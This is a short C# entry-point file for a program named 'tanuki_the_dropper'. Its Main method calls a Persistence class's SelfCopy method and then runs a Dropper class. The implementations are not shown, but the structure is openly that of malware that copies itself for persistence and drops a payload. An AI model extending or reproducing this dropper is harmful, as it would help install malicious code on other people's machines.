using Packets;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Numerics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace tanuki_the_dropper
{
    class Program
    {
        
        static void Main(string[] args)
        {
            Persistence persistence = new Persistence();
            persistence.SelfCopy();

            Dropper dropper = new Dropper();
            dropper.Run();
        }
    }
}